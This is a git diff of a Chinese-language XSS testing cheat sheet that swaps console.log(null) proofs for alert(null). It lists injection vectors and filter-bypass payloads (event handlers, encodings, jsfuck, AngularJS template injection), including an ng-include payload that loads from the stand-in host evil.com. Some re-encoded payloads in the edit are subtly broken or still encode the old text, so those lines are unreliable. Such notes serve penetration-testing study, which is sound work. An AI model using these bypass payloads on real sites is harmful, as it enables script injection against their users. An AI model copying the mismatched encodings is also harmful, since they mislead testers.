@@ -8,7 +8,7 @@ Cross-site scripting (also known as XSS) is a web security vulnerability that al
 
 Reflected 和 DOM 时常不收, 留意公告
 
-## 1. 原理
+## 1. Principle
 
 搜索 test 时, 服务器会将我输入的字符处理后返回到浏览器
 
@@ -21,29 +21,29 @@ Host: example.com
 <input value="test" type="text">
 ```
 
-若搜索的内容是一段 Payload, 如： `"onclick=console.log(null)"` 那么就会在浏览器注入 XSS
+若搜索的内容是一段 Payload, 如： `"onclick=alert(null)"` 那么就会在浏览器注入 XSS
 
 ```
-<input value=""onclick=console.log(null)"" type="text">
+<input value=""onclick=alert(null)"" type="text">
 ```
 
-### 1.1. 存在位置
+### 1.1. Location
 
 - 输入框
 - URL
 
 - 文件上传处
 
-- 由请求包控制的值
+- 任何可控参数
 
   ```
   GET /?search=test HTTP/2
   Host: example.com
-  Referer: https://example.com
+  Referer: https://xss.example.com
   ```
 
   ```
-  <input value="https://example.com" type="text">
+  <input value="https://xss.example.com" type="text">
   ```
 
   > 响应包中 `value` 的值由请求包中的 `Referer` 的值控制, 那么可能存在 XSS
@@ -55,7 +55,7 @@ Host: example.com
 | alert(null)   | console.log(null)   |
 | confirm(null) | console.info(null)  |
 | prompt(null)  | console.error(null) |
-| print(null)   | console.warn(null)  |
+| alert(null)   | console.warn(null)  |
 
 若无法弹窗验证或者控制台验证可以尝试组合 CSRF 使用
 
@@ -68,42 +68,42 @@ Host: example.com
 加载事件
 
 ```
-onload=console.log(null)	         # 元素加载完成时触发
-onerror=console.log(null)         # 元素加载失败时触发
+onload=alert(null)	         # 元素加载完成时触发
+onerror=alert(null)         # 元素加载失败时触发
 ```
 
 鼠标事件
 
 ```
-onclick=console.log(null)	     # 点击元素时触发
-ondblclick=console.log(null)      # 双击元素时触发
-oncontextmenu=console.log(null)   # 右击元素时触发
-onmousemove=console.log(null)	 # 鼠标移动到元素上方时触发
-onmouseover=console.log(null)	 # 鼠标悬停在元素上方时触发
-onmousedown=console.log(null)	 # 鼠标按下时触发
-onmouseup=console.log(null)	     # 鼠标松开时触发
-onmouseenter=console.log(null)    # 鼠标进入元素时触发
-onmouseleave=console.log(null)    # 鼠标离开元素时触发
+onclick=alert(null)	     # 点击元素时触发
+ondblclick=alert(null)      # 双击元素时触发
+oncontextmenu=alert(null)   # 右击元素时触发
+onmousemove=alert(null)	 # 鼠标移动到元素上方时触发
+onmouseover=alert(null)	 # 鼠标悬停在元素上方时触发
+onmousedown=alert(null)	 # 鼠标按下时触发
+onmouseup=alert(null)	     # 鼠标松开时触发
+onmouseenter=alert(null)    # 鼠标进入元素时触发
+onmouseleave=alert(null)    # 鼠标离开元素时触发
 ```
 
 表单事件
 
 ```
-onfocus=console.log(null)        # 元素获得焦点
-onblur=console.log(null)         # 元素失去焦点
-oninput=console.log(null)        # 用户输入时触发
-onselect=console.log(null)       # 用户选中文本时触发
-onsubmit=console.log(null)       # 表单提交时触发
-onreset=console.log(null)        # 表单重置时触发
-onchange=console.log(null)       # 输入框, 下拉框等内容变更后失焦
+onfocus=alert(null)        # 元素获得焦点
+onblur=alert(null)         # 元素失去焦点
+oninput=alert(null)        # 用户输入时触发
+onselect=alert(null)       # 用户选中文本时触发
+onsubmit=alert(null)       # 表单提交时触发
+onreset=alert(null)        # 表单重置时触发
+onchange=alert(null)       # 输入框, 下拉框等内容变更后失焦
 ```
 
 键盘事件
 
 ```
-onkeydown=console.log(null)      # 按键按下
-onkeypress=console.log(null)     # 按键按下并产生字符
-onkeyup=console.log(null)        # 按键释放
+onkeydown=alert(null)      # 按键按下
+onkeypress=alert(null)     # 按键按下并产生字符
+onkeyup=alert(null)        # 按键释放
 ```
 
 ## 2. 数据提交类
@@ -114,11 +114,14 @@ onkeyup=console.log(null)        # 按键释放
 
 ### 2.1.1. 查找注入点
 
-- 测试输入框
-- 测试 URL 
-- 在 Burp Suite 的 Intruder 模块中标记请求包中所有可能触发 XSS 的位置, 然后使用 Sniper attack 模式注入一个随机字符串, 若在响应包中匹配到这个随机字符串则可能存在 XSS
+- 输入框
+- URL
+- 文件上传处
+- 任何可控参数
 
-### 2.1.2. 无害化测试
+注入一段随机字符串, 若可在源码或响应包中找到这段字符串, 则可能存在 XSS
+
+### 2.1.2. Harmless
 
 > 在 Burp 中测试 GET 请求时需要对空格进行 URL 编码, 若成功解析则响应中的标签是彩色的
 
@@ -151,7 +154,7 @@ onkeyup=console.log(null)        # 按键释放
 提交这个字符串可以判断过滤了哪些字符
 
 ```
-javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+console.log(null);//'>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(null);//'>
 ```
 
 使用 OOB 测试 Blind XSS
@@ -196,7 +199,7 @@ Content-Disposition: form-data; name="uploaded"; filename="XSS.png"
 Content-Disposition: form-data; name="uploaded"; filename="XSS.html"
 
  PNG
-<script>console.log(null)</script>
+<img/src/onerror=alert(null)>
 ```
 
 从 Burp Suite 中查找关键词 XSS.html 得到路径后访问 URL 即可触发 XSS
@@ -216,12 +219,9 @@ data:image/png;base64,VGhpcyBpcyBhIHRlc3QgZmllbGQ=
 ```
 
 ```
-data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZyhudWxsKTwvc2NyaXB0Pg==
+data:text/html;base64,PGltZy9zcmMvb25lcnJvcj1hbGVydChudWxsKT4=
 ```
 
----
-
-- [xss](https://github.com/jadensalas469466/tools/tree/main/hack/payload/xss)
 - [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)
 
 ## 4. Bypass
@@ -229,47 +229,47 @@ data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZyhudWxsKTwvc2NyaXB0Pg==
 引号闭合插入事件绕过
 
 ```
-" onclick=console.log(null)
+" onclick=alert(null)
 ```
 
 ```
-" autofocus onfocus=console.log(null) x="
+" autofocus onfocus=alert(null) x="
 ```
 
 尖括号闭合插入标签绕过
 
 ```
-"><img/src/onerror=console.log(null)>
+"><img/src/onerror=alert(null)>
 ```
 
 `href` 伪协议绕过
 
 ```
-<a href=javascript:console.log(null)>1</a>
+<a href=javascript:alert(null)>1</a>
 ```
 
 双写绕过
 
 ```
-<a href=javascjavascriptript:console.log(null)>1</a>
+<a href=javascjavascriptript:alert(null)>1</a>
 ```
 
 大小写绕过
 
 ```
-<a href=jaVaScRipT:console.log(null)>1</a>
+<a href=jaVaScRipT:alert(null)>1</a>
 ```
 
 URL 编码绕过
 
 ```
-%27%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dconsole.log%28null%29%3E
+%27%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dalert%28null%29%3E
 ```
 
 添加 HTML 编码后的 Tab 绕过
 
 ```
-<a href=javasc&#09;ript:console.log(null)>1</a>
+%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dalert%28null%29%3E
 ```
 
 ## 5. 特殊情况
@@ -299,13 +299,13 @@ URL 编码绕过
 若引入的 URL 存在 XSS 则可能对在当前网站生效
 
 ```
-<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=console.log(null)>'"></span></body>
+<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=alert(null)>'"></span></body>
 ```
 
 默认情况下 ng-include 只能引入当前网站的 URL
 
 ```
-<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=console.log(null)>'"></span></body>
+<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=alert(null)>'"></span></body>
 ```
 
 ### 5.3.ng-app
@@ -313,33 +313,33 @@ URL 编码绕过
 被 `ng-app` 包裹的的指令, 可以尝试 `{{}}` 
 
 ```
-{{constructor.constructor('console.log(null)')()}}
+{{constructor.constructor('alert(null)')()}}
 ```
 
 相当于
 
 ```
-Function('console.log(null)')()
+Function('alert(null)')()
 ```
 
 ## 6. 编码
 
-分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="console.log(null)"` ，生成了 `onmousemove=""` 属性
+分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="alert(null)"` ，生成了 `onmousemove=""` 属性
 
 ```
-xss"> ,:;onmousemove=console.log(null)
+xss"> ,:;onmousemove=alert(null)
 ```
 
 atob 解 Base64 编码绕过
 
 ```
-<script>eval(atob("Y29uc29sZS5sb2cobnVsbCk="))</script>
+<script>eval(atob("YWxlcnQobnVsbCk="))</script>
 ```
 
 尖括号的十六进制编码绕过
 
 ```
-\\x3cscript\\x3econsole.log(null)\\x3c/script\\x3e
+\\x3cscript\\x3ealert(null)\\x3c/script\\x3e
 ```
 
 **js 中的编码 `<script></script>` 解码后执行**
@@ -347,13 +347,13 @@ atob 解 Base64 编码绕过
 ASCII
 
 ```
-eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,110,117,108,108,41))
+eval(String.fromCharCode(97,108,101,114,116,40,110,117,108,108,41))
 ```
 
 Base64
 
 ```
-eval(atob("Y29uc29sZS5sb2cobnVsbCk="))
+eval(atob("YWxlcnQobnVsbCk="))
 ```
 
 **无需解码直接执行**
@@ -361,19 +361,19 @@ eval(atob("Y29uc29sZS5sb2cobnVsbCk="))
 hex
 
 ```
-eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x6e\x75\x6c\x6c\x29")
+eval("\x61\x6c\x65\x72\x74\x28\x6e\x75\x6c\x6c\x29")
 ```
 
 unicode
 
 ```
-\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067(\u006e\u0075\u006c\u006c)
+\u0061\u006c\u0065\u0072\u0074\u0028\u006e\u0075\u006c\u006c\u0029
 ```
 
 jsfuck
 
 ```
-[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[+[]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])
+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[+[]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])
 ```
 
 ```
@@ -383,15 +383,15 @@ jsfuck
 伪协议绕过(空格可以用 / 代替)
 
 ```
-<img/src/onerror=location="javascript:console.log(null)">
+<img/src/onerror=location="javascript:alert(null)">
 ```
 
 **目标执行顺序**
 
 ```
-1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:console.log(null)" 为 onerror 属性的值
-2.浏览器解析 location 中的 url	自动解码 URL 编码 console.log(null)
-3.浏览器识别 javascript 伪协议	自动解码 js 编码 console.log(null)	（括号和括号内的不能编两次）
+1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:alert(null)" 为 onerror 属性的值
+2.浏览器解析 location 中的 url	自动解码 URL 编码 alert(null)
+3.浏览器识别 javascript 伪协议	自动解码 js 编码 alert(null)	（括号和括号内的不能编两次）
 
 黑客编码顺序反过来321
 
@@ -400,63 +400,46 @@ jsfuck
 解码过程:解码HTML编码→伪协议解码URL编码→JS解释器自动解码JS编码→执行
 ```
 
-1.对 console.log(null) 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）
+1.对 alert(null) 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）
 
 ```
-\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u006e\u0075\u006c\u006c\u0029
-<img/src/onerror=location="javascript:\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u006e\u0075\u006c\u006c\u0029">
+<img src="" onerror="location='javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u006e\u0075\u006c\u006c\u0029'">
 ```
 
 2.对 alert 的 unicode 编码进行 url 编码 （括号和括号里的值不能编两次，也可以不进行 unicode 编码而进行 url 编码，二者只能选择其一）
 
 ```
-%5c%75%30%30%36%33%5c%75%30%30%36%66%5c%75%30%30%36%65%5c%75%30%30%37%33%5c%75%30%30%36%66%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%32%65%5c%75%30%30%36%63%5c%75%30%30%36%66%5c%75%30%30%36%37
+<img src="" onerror="location='javascript:%5c%75%30%30%36%61%5c%75%30%30%36%6c%5c%75%30%30%36%72%5c%75%30%30%36%74%5c%75%30%30%36%74%28%6e%75%6c%6c%29'">
 ```
 
-```
-<img/src/onerror=location="javascript:%5c%75%30%30%36%33%5c%75%30%30%36%66%5c%75%30%30%36%65%5c%75%30%30%37%33%5c%75%30%30%36%66%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%32%65%5c%75%30%30%36%63%5c%75%30%30%36%66%5c%75%30%30%36%37\u0028\u006e\u0075\u006c\u006c\u0029">
-```
-
-3.对 location="javascript:console.log(null)" 的 console.log(null) 进行 unicode 编码后又对 alert 进行编码后对  location="javascript:console.log(null)" 这个编码的结果再进行 html 编码
-
-```
-&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x36;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x36;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x37;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x38;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x39;&#x22;
-```
+3.对 location="javascript:alert(null)" 的 alert(null) 进行 unicode 编码后又对 alert 进行编码后对  location="javascript:alert(null)" 这个编码的结果再进行 html 编码
 
 ```
 <img/src/onerror=&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x36;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x36;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x37;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x38;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x39;&#x22;>
 ```
 
-字符串切割：
+字符串切割
 
 ```
-字符串中的部分（""中的内容） "javascript:console.log(null)" 可以写成	"j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+")"
-```
-
-```
-<img/src/onerror=location="j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"c"+"o"+"n"+"s"+"o"+"l"+"e"+"."+"l"+"o"+"g"+"("+"n"+"u"+"l"+"l"+")">
+<img src="" onerror=location="j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+ "n"+"u"+"l"+"l"+")">
 ```
 
 注释绕过（`/*注释*/`）
 
 ```
-<input onfocus=location="java&#09;sc"+/**/"ript:\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u006e\u0075\u006c\u006c\u0029" autofocus>
+<input onfocus=location="java&#09;sc"+/**/"ript:\u0061\u006c\u0065\u0072\u0074\u0028\u006e\u0075\u006c\u006c\u0029" autofocus>
 ```
 
 注释加入到分割
 
 ```
-<img/src/onerror=location="j"+"a"+/**/"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"c"+"o"+"n"+"s"+"o"+"l"+"e"+/**/"."+"l"+"o"+"g"+"("+"n"+"u"+"l"+"l"+")">
+<img src="" onerror=location="j"+"a"+/**/"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+ "n"+"u"+"l"+"l"+")">
 ```
 
 svg 可以自动解析 js 标签中的 html 编码
 
 ```
-<svg><script>console.log(null)</script>
-```
-
-```
-<svg><script>&#x63;&#x6f;&#x6e;&#x73;&#x6f;&#x6c;&#x65;&#x2e;&#x6c;&#x6f;&#x67;&#x28;&#x6e;&#x75;&#x6c;&#x6c;&#x29;</script>
+<svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x6e;&#x75;&#x6c;&#x6c;&#x29;</script></svg>
 ```
 
 null char
@@ -472,25 +455,26 @@ null char
 IE 浏览器 input 标签 style 属性伪协议绕过
 
 ```
-style="background-image:url(javascript:console.log(null))"
+style="background-image:url(javascript:alert(null))"
 ```
 
 IE 浏览器的 expression 绕过
 
 ```
-hello:expression(console.log(null))
+hello:expression(alert(null))
 ```
 
 CSS 层叠样式表注释会替换为空
 
 ```
